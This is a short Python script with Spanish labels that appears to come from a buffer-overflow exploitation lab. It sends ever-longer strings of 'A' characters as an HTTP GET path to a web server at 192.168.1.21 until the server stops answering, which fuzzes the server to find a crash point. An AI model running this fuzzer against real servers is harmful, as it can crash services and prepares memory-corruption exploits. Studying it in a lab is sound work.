import socket
contador =100
buffer = ""
metodo_entrada = "GET"
cabecera = "HTTP/1.1 \r\n\r\n"
while True:
	buffer = buffer + "A"*contador
	try:
		s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.1.21',80))
		print ("Lanzando cadena con %d bytes" %len(buffer))
		s.send(metodo_entrada + buffer + cabecera)
		s.recv(1024)
		s.close()
	except:
		exit()
